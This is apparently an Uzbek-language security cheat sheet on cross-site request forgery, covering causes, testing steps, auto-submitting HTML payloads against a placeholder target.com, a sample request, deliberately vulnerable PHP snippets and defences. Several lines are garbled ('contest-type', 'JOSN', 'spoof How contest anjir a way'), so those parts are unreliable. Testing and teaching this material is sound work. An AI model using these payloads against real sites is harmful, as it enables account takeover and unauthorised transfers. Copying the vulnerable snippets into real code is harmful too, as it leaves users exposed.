# Cross-Site Request Forgery (CSRF)

## 1. Ta'rif
CSRF — foydalanuvchi brauzeri attacker boshqargan sahifada bo'lib, autentifikatsiya qilingan foydalanuvchi nomidan kerakli state-changing request'ni (change password, transfer, admin create) yuboradi. Cookie asosida auth → CSRF.

## 2. Qayerdan kelib chiqadi
- State-changing request'lar (POST/PUT/DELETE) CSRF token/Origin/Custom header'siz
- Cookie asosida auth qilinadi (session cookie req'ga avtomat keladi)
- SameSite cookie flag yo'q yoki None
- GET bilan state change (GET /delete?id=1)
- JSON API'da contest-type check yo'q (form-encoded cross)
- Login CSRF, logout CSRF ham mumkin

## 3. Turlari
| Tur | Tavsif |
|-----|--------|
| HTML form | klassik POST form |
| GET-based | `GET /account/delete` |
| JSON CSRF | `<form>` method POST enctype=text/plain | `JOSN` |
| Login CSRF | attacker login foydalanuvchiga o'z hisobini |
| SameSite bypass | Lax → `GET` top-level navigation / 30 gün window |

## 4. Metodologiya
1. State-changing endpointni toping: profile update, password change, delete, transfer.
2. Request'da CSRF token bormi? `csrftoken`, `_token`, `authenticity_token`, header (X-CSRF-Token).
3. Token ishlatiladimi / validation'ni tekshirish:
   - Token butunlay yo'q → zaif
   - Token bor, lekin o'zini tekshirmaydi (only presence)
   - Token barcha user'larga bir xil
   - Token valid qilmaydi — o'zingizda olingan token ham works
4. Token triangular: cookie'da ham bir xil (double-submit) — cookie'ni o'rnatib joylay olasiz?
   - Cookie o'rnatish: `DOMAIN` attribute (subdomain), CRLF/injection
5. Origin/Referer validation:
   - `Origin` tekshirilmaydi, yoki aspekt qiymat
   - Referer absent (meta referrer) — uni status qabul
6. JSON CSRF: `text/plain` POST.
7. Confirmation dialog/action yo'q bo'lsa painless.

## 5. POC'il
```html
<!-- klassik form -->
<form action="https://target.com/account/change_password" method="POST">
  <input name="newpass" value="attacker123">
  <input name="confirm" value="attacker123">
</form>
<script>document.forms[0].submit()</script>

<!-- GET based -->
<a href="https://target.com/delete?id=999">click me</a>

<!-- JSON CSRF: form text/plain -->
<form action="https://target.com/api/password" method="POST"
      enctype="text/plain">
  <input name='{"newpass":"attacker123","a":"' value='"}'>
</form>

<!-- auto-submit img -->
<img src="https://target.com/api/transfer?to=attacker&amt=1000" />
```

## 6. Request misollari
```
POST /account/password HTTP/1.1
Host: target.com
Cookie: session=...
Content-Type: application/x-www-form-urlencoded

new_password=attacker123&confirm=attacker123

# Response'da token yo'q; CSRF yo'q -> zaiflik
```

## 7. Zaif code misollari
```php
// ZAIF — token yo'q
if ($_POST['password']) { change_password($user, $_POST['password']); }

// ZAIF — faqat token mavjudligi
if (isset($_POST['_token'])) { ... }

// ZAIF — SameSite None
session_set_cookie_params(['samesite' => 'None']);
```
## 8. Nimalarga ahamiyat berish (checklist)
- [ ] State-changing + GET bo'lsa — aniq zaif (CSRF + CSRF-linking XSS)
- [ ] Token bormi: yo'q/global/session-spesifik/single-use
- [ ] Token cookie'da bir xil bo'lsa — cookie'ni o'rnata olasizmi
- [ ] Origin/Referer: tekshiriladi — spoof How contest anjir a way (`Origin: target.com.attacker.com`)
- [ ] SameSite flag: Lax/Strict bo'lsa g'olib Get top-nav sinash (30 gün ichida ko'p request ho'l)
- [ ] JSON API — `text/plain` formatan
- [ ] Login CSRF — foydalanuvchi attacker akkauntiga bezgak
- [ ] Token regeneratsiya — logout/login → token o'zgaradimi

## 9. Himoya
- Synchronizer CSRF token (session-binds, single-use), validate
- SameSite=Lax/Strict cookie, `_csrf` custom header
- Double submit: random token cookie bilan juft
- Never GET state-change; content-type check for JSON; custom header check (X-Requested-With)